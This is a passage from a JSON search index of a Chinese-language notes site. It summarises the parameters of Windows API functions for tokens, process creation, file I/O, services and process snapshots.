CreateProcessWithTokenW"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#2-createprocessasusera","text":"BOOL CreateProcessAsUserA( HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); \u5927\u81f4\u4e0a\u4e0eCreateProcessWithTokenW\u4e00\u6837\u3002 \u4f46\u662f\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u7684\u8fdb\u7a0b\u5fc5\u987b\u6709 SE_INCREASE_QUOTA_NAME \uff0c\u6216\u8005 SE_ASSIGNPRIMARYTOKEN_NAME \u6743\u9650\uff0c\u4e0d\u7136\u4f1a\u8fd4\u56deERROR:1314","title":"\u4ee5\u4ee4\u724c\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff082\uff09: CreateProcessAsUserA"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#token-duplicatetokenex","text":"BOOL DuplicateTokenEx( HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken ); hExistingToken \u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u4e00\u4e2a\u6709 TOKEN_DUPLICATE \u6743\u7684Token dwDesiredAccess \u4e3a\u65b0Token\u8bbe\u7f6e\u6743\u9650\u3002\u82e5\u7f6e0\u5219\u8868\u793a\u6743\u9650\u4e0e\u539fToken\u76f8\u540c\u3002 \u4e0b\u9762\u662f\u6743\u9650\u5217\u8868 https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects lpTokenAttributes \u6307\u5411\u5b89\u5168\u63cf\u8ff0\u7b26\u7684\u6307\u9488\u3002\u82e5\u4e3aNULL\uff0c\u5219\u4e3a\u9ed8\u8ba4\u5b89\u5168\u63cf\u8ff0\u7b26\u4e14\u53e5\u67c4\u4e0d\u80fd\u88ab\u7ee7\u627f ImpersonationLevel \u4ece SECURITY_IMPERSONATION_LEVEL \u4e2d\u9009\u62e9\u4e00\u4e2a\u503c\u586b\u5165\u3002\u51b3\u5b9a\u6a21\u4eff\u7684\u7a0b\u5ea6\u3002 TokenType \u9009\u62e9 TokenPrimary or TokenImpersonation \u586b\u5165\u3002\u51b3\u5b9aToken\u662fprimary token\uff08\u80fd\u88ab\u7528\u6765\u6267\u884cCreateProcessAsUser\uff09\u8fd8\u662fimpersonation token phNewToken \u6307\u9488\uff0c\u6307\u5411\u627f\u8f7d\u65b0Token\u7684Handle\u53d8\u91cf\u3002","title":"\u4e3a\u5df2\u5b58\u5728\u7684Token\u521b\u5efa\u526f\u672c: DuplicateTokenEx"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#io","text":"","title":"\u6587\u4ef6IO"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#getmoudlehandlea","text":"HMODULE GetModuleHandleA( LPCSTR lpModuleName ); lpModuleName\u5373\u8981\u83b7\u53d6\u7684\u6587\u4ef6\u53e5\u67c4\u7684\u6587\u4ef6\u540d\uff0c\u53ef\u4e3aexe\u6216dll\u3002 \u82e5\u6587\u4ef6\u540d\u6ca1\u6709\u540e\u7f00\u540d\u5219\u9ed8\u8ba4\u89c6\u4e3adll\u6587\u4ef6\u3002 \u82e5\u8be5\u9879\u4e3aNULL\uff0c\u5219\u8fd4\u56de\u5f53\u524d\u8fdb\u7a0b\u7684\u6587\u4ef6\u53e5\u67c4\u3002 \u5b58\u5728\u4e8eKerner32.dll\u4e2d \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9bHMOUDLE\u662f\u4e2a\u4ec0\u4e48\u73a9\u610f \u4e00\u822c\u5c31\u662f\u4e00\u4e2a\u7ebf\u6027\u5730\u5740\uff0c\u7528\u4e8e\u8bb0\u5f55\u4e00\u4e2a\u6587\u4ef6\u53e5\u67c4\u7684\u5730\u5740\u3002","title":"\u83b7\u5f97\u6587\u4ef6\u53e5\u67c4\uff1aGetMoudleHandleA"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#dllgetprocaddress","text":"FARPROC GetProcAddress( HMODULE hModule, LPCSTR lpProcName ); hmodule \u8868\u793a\u8981\u4f20\u5165\u7684dll\u6587\u4ef6\u53e5\u67c4\u3002\u8fd9\u4e2a\u53e5\u67c4\u53ef\u4ee5\u7531 LoadLibrary , LoadLibraryEx , LoadPackagedLibrary , or GetModuleHandle \u7b49\u65b9\u6cd5\u5f97\u5230\u3002 lpProcName\u8868\u793a\u8981\u4ecedll\u6587\u4ef6\u4e2d\u83b7\u5f97\u7684\u51fd\u6570\u6ca1\u6216\u8005\u53d8\u91cf\u540d\u3002 \u82e5\u51fd\u6570\u6267\u884c\u4e0d\u6210\u529f\uff0c\u5219\u8fd4\u56deNULL\uff0c\u5426\u5219\u8fd4\u56de\u51fd\u6570\u6216\u8005\u53d8\u91cf\u7684\u5730\u5740","title":"\u4ecedll\u6587\u4ef6\u53e5\u67c4\u4e2d\u83b7\u5f97\u51fd\u6570\uff1aGetProcAddress"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#createfile","text":"HANDLE CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile ); lpFileName \u6587\u4ef6\u8def\u5f84 dwDesiredAccess \u5bf9\u6587\u4ef6\u7684\u8bbf\u95ee\u63a7\u5236\uff1a\u8bfb\uff0c\u5199\u3002 GENERIC_READ , GENERIC_WRITE , or both ( GENERIC_READ | GENERIC_WRITE ) dwShareMode \u96f6\u8868\u793a\u4e0d\u5171\u4eab\uff1b FILE_SHARE_READ \u548c / \u6216 FILE_SHARE_WRITE \u8868\u793a\u5141\u8bb8\u5bf9\u6587\u4ef6\u8fdb\u884c\u5171\u4eab\u8bbf\u95ee lpSecurityAttributes \u5b89\u5168\u63cf\u8ff0\u7b26 dwCreationDisposition \u5728\u6587\u4ef6\u4e0d\u5b58\u5728\u6216\u5b58\u5728\u65f6\u91c7\u53d6\u7684\u64cd\u4f5c dwFlagsAndAttributes \u8bbe\u7f6e\u6587\u4ef6\u6807\u5fd7\u4f4d hTemplateFile \u591a\u6570\u60c5\u51b5\u4e0b\u4e3aNULL","title":"\u83b7\u5f97\u4e00\u4e2a\u5df2\u5b58\u5728\u6587\u4ef6\u53e5\u67c4\u6216\u8005\u65b0\u5efa\u6587\u4ef6\u53e5\u67c4:CreateFile"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#readfile","text":"BOOL WriteFile( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped ); hFile \u6587\u4ef6\u53e5\u67c4 lpBuffer \u8981\u5199\u5165\u7684\u6570\u636e\u7f13\u5b58\u533a nNumberOfBytesToWrite \u8981\u5199\u5165\u7684\u5b57\u8282\u6570 lpNumberOfBytesWritten \u8bbe\u7f6e\u4e00\u4e2a\u53d8\u91cf\uff0c\u7528\u6765\u63a5\u6536\u5199\u5165\u7684\u5185\u5bb9 lpOverlapped \u901a\u5e38\u4e3aNULL","title":"\u5199\u6587\u4ef6: ReadFile"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#readfile_1","text":"BOOL ReadFile( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped ); \u548cWriteFile\u5dee\u4e0d\u591a\uff0c8\u8bf4\u4e86","title":"\u8bfb\u6587\u4ef6: ReadFile"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#_4","text":"","title":"\u670d\u52a1"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#openscmanagera","text":"SC_HANDLE OpenSCManagerA( LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess ); lpMachineName \u6307\u5b9a\u8ba1\u7b97\u673a\u7684\u540d\u5b57\u3002\u82e5\u4e3aNULL\u5219\u6307\u5411\u672c\u5730\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668 lpDatabaseName \u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u6570\u636e\u5e93\u540d\u3002\u4e00\u822c\u8bbe\u4e3a SERVICES_ACTIVE_DATABASE \u3002\u82e5\u4e3aNULL\u5219\u9ed8\u8ba4\u6253\u5f00 SERVICES_ACTIVE_DATABASE dwDesiredAccess \u5bf9\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u6743\u9650\u8bbe\u7f6e\u3002\u53c2\u6570\u6e05\u5355: https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights \u82e5\u6267\u884c\u6210\u529f\u5219\u8fd4\u56de\u670d\u52a1\u7ba1\u7406\u5668\u6570\u636e\u5e93\u7684\u53e5\u67c4\u3002\u53cd\u4e4b\u5219NULL\u3002","title":"\u5efa\u7acb\u4e0e\u6307\u5b9a\u8ba1\u7b97\u673a\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u8054\u7edc\u5e76\u6253\u5f00\u5176\u6570\u636e\u5e93: OpenSCManagerA"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#createservicea","text":"SC_HANDLE CreateServiceA( SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword ); hSCManager \u670d\u52a1\u7ba1\u7406\u5668\u6570\u636e\u5e93\u53e5\u67c4\u3002\u53ef\u7531OpenSCManagerA\u83b7\u5f97\u3002\u53e5\u67c4\u6743\u9650\u5fc5\u987b\u6709 SC_MANAGER_CREATE_SERVICE lpServiceName \u8981\u521b\u5efa\u7684\u670d\u52a1\u540d\u3002 lpDisplayName \u7528\u6237\u754c\u9762\u7a0b\u5e8f \u7528\u6765\u6807\u8bc6\u670d\u52a1\u7684 \u663e\u793a\u540d\u79f0 \uff0c\u53ef\u4e0elpServiceName\u4e00\u81f4 dwDesiredAccess \u5bf9\u670d\u52a1\u7ba1\u7406\u5668\u7684\u6743\u9650\u3002\u53c2\u6570\u6e05\u5355\u5728\u4e0a\u9762 dwServiceType \u521b\u5efa\u7684\u670d\u52a1\u7684\u7c7b\u578b\u3002\uff08\u76f4\u63a5\u590d\u5236\u7c98\u8d34\u53c2\u6570\u5427 Value Meaning \u200b SERVICE_ADAPTER 0x00000004 Reserved. \u200b SERVICE_FILE_SYSTEM_DRIVER 0x00000002 File system driver service. \u200b SERVICE_KERNEL_DRIVER 0x00000001 Driver service. \u200b SERVICE_RECOGNIZER_DRIVER 0x00000008 Reserved. \u200b SERVICE_WIN32_OWN_PROCESS 0x00000010 Service that runs in its own process. \u200b SERVICE_WIN32_SHARE_PROCESS 0x00000020 Service that shares a process with one or more other services. For more information, see Service Programs . \u200b SERVICE_USER_OWN_PROCESS 0x00000050 The service runs in its own process under the logged-on user account. \u200b SERVICE_USER_SHARE_PROCESS 0x00000060 The service shares a process with one or more other services that run under the logged-on user account. If you specify either SERVICE_WIN32_OWN_PROCESS or SERVICE_WIN32_SHARE_PROCESS , and the service is running in the context of the LocalSystem account , you can also specify the following value. Value Meaning \u200b SERVICE_INTERACTIVE_PROCESS 0x00000100 The service can interact with the desktop.For more information, see Interactive Services . dwStartType \u670d\u52a1\u7684\u5f00\u59cb\u9009\u9879\uff0c\u53c2\u6570\u5982\u4e0b Value Meaning \u200b SERVICE_AUTO_START 0x00000002 A service started automatically by the service control manager during system startup. For more information, see Automatically Starting Services . \u200b SERVICE_BOOT_START 0x00000000 A device driver started by the system loader. This value is valid only for driver services. \u200b SERVICE_DEMAND_START 0x00000003 A service started by the service control manager when a process calls the StartService function. For more information, see Starting Services on Demand . \u200b SERVICE_DISABLED 0x00000004 A service that cannot be started. Attempts to start the service result in the error code ERROR_SERVICE_DISABLED . \u200b SERVICE_SYSTEM_START 0x00000001 A device driver started by the IoInitSystem function. This value is valid only for driver services. dwErrorContriol \u670d\u52a1\u5bf9\u4e8e\u9519\u8bef\u7684\u5bb9\u5fcd\u7a0b\u5ea6\u3002 lpBinaryPathName \u670d\u52a1\u7684\u7edd\u5bf9\u8def\u5f84\u3002 lpLoadOrderGroup \u670d\u52a1\u6240\u5c5e\u7684\u52a0\u8f7d\u6392\u5e8f\u7ec4\u540d\u79f0\u3002\u5982\u679c\u670d\u52a1\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a\u7ec4\u5219\u586bNULL\u6216\u7a7a\u5b57\u7b26 lpdwTagId \u4e00\u4e2a\u6307\u5411\u53d8\u91cf\u7684\u6307\u9488\uff0c\u8be5\u53d8\u91cf\u63a5\u6536\u5728lpLoadOrderGroup\u53c2\u6570\u4e2d\u6307\u5b9a\u7684\u7ec4\u4e2d\u552f\u4e00\u7684\u6807\u8bb0\u503c\u3002 \u4e00\u822c\u7f6eNULL lpDependencies \u4e00\u4e2a\u4ee5null\u7ed3\u5c3e\u7684\u6307\u5411\u670d\u52a1\u6216\u8005\u52a0\u8f7d\u987a\u5e8f\u7ec4\u7684\u6307\u9488\uff0c\u5728\u5f53\u524d\u670d\u52a1\u542f\u52a8\u524d\u5fc5\u987b\u5148\u542f\u52a8\u8be5\u9879\u6307\u5411\u7684\u670d\u52a1\u6216\u52a0\u8f7d\u987a\u5e8f\u7ec4\uff0c\u5373\u542f\u52a8\u5f53\u524d\u670d\u52a1\u7684\u4f9d\u8d56\u9879\u3002\u82e5\u670d\u52a1\u4e0d\u9700\u8981\u4f9d\u8d56\u9879\u5219\u7f6eNULL lpServiceStartName \u670d\u52a1\u8fd0\u884c\u7684\u8d26\u6237\u3002\u82e5\u4e3aNULL\u5219\u7528LocalSystem Account\u8d26\u6237\uff08\u5373SYSTEM) lpPassword \u8d26\u6237\u7684\u5bc6\u7801\u3002\u82e5\u4e3aLocalSystemAccount\u5219\u586bNULL\uff08SYSTEM\u8d26\u6237\u6ca1\u6709\u5bc6\u7801\uff09 \u6210\u529f\u5219\u8fd4\u56de\u670d\u52a1\u53e5\u67c4\uff0c\u53cd\u4e4b\u5219NULL","title":"\u521b\u5efa\u4e00\u4e2a\u670d\u52a1\u5e76\u628a\u5b83\u52a0\u5165\u5230\u670d\u52a1\u7ba1\u7406\u5668\u6570\u636e\u5e93\uff1a CreateServiceA"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#openservicea","text":"SC_HANDLE OpenServiceA( SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess ); hSCManager \u6307\u5411\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u6570\u636e\u5e93\u7684\u53e5\u67c4\u3002 lpServiceName \u670d\u52a1\u540d\uff0c\u6ce8\u610f\u4e0d\u662flpDisplayName dwDesiredAccess \u5bf9\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u6743\u9650 \u6210\u529f\u5219\u8fd4\u56de\u670d\u52a1\u53e5\u67c4\uff0c\u53cd\u4e4b\u5219NULL","title":"\u6253\u5f00\u4e00\u4e2a\u670d\u52a1\u5e76\u83b7\u5f97\u53e5\u67c4: OpenServiceA"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#controlservice","text":"BOOL ControlService( SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus ); hService \u6307\u5411\u670d\u52a1\u7684\u53e5\u67c4 dwControl \u63a7\u5236\u6307\u4ee4\u3002\u8be6\u60c5\u53c2\u8003 https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-controlservice?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FControlService);k(ControlService);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue lpServiceStatus \u6307\u5411 SERVICE_STATUS \u7ed3\u6784\u7684\u6307\u9488\uff0c\u8be5\u7ed3\u6784\u7528\u4e8e\u63a5\u6536\u670d\u52a1\u62a5\u544a\u7ed9\u670d\u52a1\u7ba1\u7406\u5668\u7684\u6700\u65b0\u72b6\u6001\u3002","title":"\u5411\u4e00\u4e2a\u670d\u52a1\u53d1\u9001\u63a7\u5236\u6307\u4ee4:ControlService"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#scm-startservicectrldispatchera","text":"BOOL StartServiceCtrlDispatcherA( const SERVICE_TABLE_ENTRYA *lpServiceStartTable ); lpServiceStartTable \u6307\u5411\u4e00\u4e2a SERVICE_TABLE_ENTRY \u7ed3\u6784\uff0c\u5176\u5305\u542b\u4e86\u6bcf\u4e2a\u670d\u52a1\u7684\u5165\u53e3\u70b9\u3002\u8be5\u7ed3\u6784\u6700\u540e\u4e00\u4e2a\u5165\u53e3\u70b9\u5fc5\u987b\u662fNULL\u6765\u8868\u793a\u8be5\u7ed3\u6784\u5df2\u7ed3\u675f\u3002 \u8fd9\u4e2a\u7ed3\u6784\u7684\u5b9a\u4e49\u5982\u4e0b typedef struct _SERVICE_TABLE_ENTRYW { LPWSTR lpServiceName; LPSERVICE_MAIN_FUNCTIONW lpServiceProc; }SERVICE_TABLE_ENTRYW, *LPSERVICE_TABLE_ENTRYW; \u5f53SCM\u5f00\u59cb\u4e00\u4e2a\u670d\u52a1\u8fdb\u7a0b\u65f6\uff0c\u4fbf\u5728\u7b49\u5f85\u670d\u52a1\u8c03\u7528StartServiceCtrlDispatcherA \u51fd\u6570\uff0c\u82e5\u8be5\u51fd\u6570\u957f\u65f6\u95f4\u6ca1\u6709\u8c03\u7528\uff08\u4e00\u822c\u4e3a30s)\uff0c\u5219\u670d\u52a1\u4f1a\u88ab\u5f3a\u884c\u5173\u95ed\u3002\u76f4\u5230\u6240\u6709\u8be5\u51fd\u6570\u6307\u5b9a\u7684\u670d\u52a1\u8fdb\u5165SERVICE_STOPPED\u9636\u6bb5\uff0c\u8fd9\u4e2a\u51fd\u6570\u624d\u4f1a\u8fd4\u56de\u503c\u3002","title":"\u4f7f\u670d\u52a1\u4e0eSCM\u94fe\u63a5\uff1a StartServiceCtrlDispatcherA"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#registerservicectrlhandlera","text":"SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA( LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc ); lpServiceName \u670d\u52a1\u7684\u540d\u5b57\u3002 lpHandlerProc \u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u8981\u88ab\u6ce8\u518c\u7684handler\u51fd\u6570 \u82e5\u6210\u529f\uff0c\u5219\u8fd4\u56de\u670d\u52a1\u72b6\u6001\u53e5\u67c4\uff0c\u82e5\u5931\u8d25\u5219\u8fd4\u56de0 \u8fd9\u4e2a\u51fd\u6570\u7684\u4e3b\u8981\u76ee\u7684\u662f \u53ef\u4ee5\u8ba9\u4e00\u4e2a\u670d\u52a1\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u88ab\u6765\u81ea\u5176\u4ed6\u5730\u65b9\u7684\u63a7\u5236\u6307\u4ee4\u6240\u63a7\u5236\uff0c\u5e76\u6839\u636e\u81ea\u5df1\u5b9a\u4e49\u7684\u51fd\u6570\u505a\u51fa\u5bf9\u5e94\u7684\u884c\u4e3a","title":"\u6ce8\u518c\u4e00\u4e2a\u51fd\u6570\u6765\u5904\u7406\u670d\u52a1\u63a7\u5236\u8bf7\u6c42: RegisterServiceCtrlHandlerA"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#setservicestatus","text":"BOOL SetServiceStatus( SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus ); hServiceStatus \u6307\u5411\u670d\u52a1\u72b6\u6001\u53e5\u67c4\uff0c\u8fd9\u4e2a\u53e5\u67c4\u7531RegisterServiceCtrlHandlerA \u7b49\u51fd\u6570\u8fd4\u56de lpServiceStatus \u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411 SERVICE_STATUS \u7ed3\u6784\uff0c\u8fd9\u4e2a\u7ed3\u6784\u8bb0\u5f55\u4e86\u670d\u52a1\u7684\u72b6\u6001","title":"\u66f4\u65b0\u670d\u52a1\u7684\u72b6\u6001\u4fe1\u606f: SetServiceStatus"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#tlhelp32h","text":"","title":"\u5feb\u7167 \u4ee5\u4e0b\u51fd\u6570\u6216\u7ed3\u6784\u57fa\u672c\u4e0a\u90fd\u7528\u5230\u4e86\u53e6\u4e00\u4e2a\u5934\u6587\u4ef6Tlhelp32.h"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#createtoolhelp32snapshot","text":"HANDLE CreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID ); dwFlags \u8f6c\u50a8\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u8f6c\u50a8\u54ea\u4e9b\u4fe1\u606f\u4ee5\u53ca\u6307\u5b9a\u8fd4\u56de\u7684\u53e5\u67c4\u7684\u4e00\u4e9b\u4fe1\u606f \u8be6\u7ec6\u53c2\u6570 https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot th32ProcessID \u8981\u88ab\u8f6c\u50a8\u7684\u8fdb\u7a0b\u7684PID\u3002\u7f6e0\u5219\u6307\u5b9a\u5f53\u524d\u8fdb\u7a0b\uff0c\u5f53dwFlags\u4e3a TH32CS_SNAPHEAPLIST , TH32CS_SNAPMODULE , TH32CS_SNAPMODULE32 , or TH32CS_SNAPALL \u65f6\uff0c\u8be5\u503c\u624d\u8868\u793a\u8981\u88ab\u8f6c\u50a8\u7684\u8fdb\u7a0bPID\uff0c\u5426\u5219\u8be5\u503c\u4f1a\u88ab\u5ffd\u7565\u5e76\u8f6c\u50a8\u6240\u6709\u8fdb\u7a0b \u51fd\u6570\u6210\u529f\u8fd4\u56de\u5feb\u7167\u7684\u53e5\u67c4\uff0c\u5426\u5219\u8fd4\u56de INVALID_HANDLE_VALUE","title":"\u4e3a\u8fdb\u7a0b\u521b\u5efa\u5feb\u7167\u6587\u4ef6(\u8f6c\u50a8): 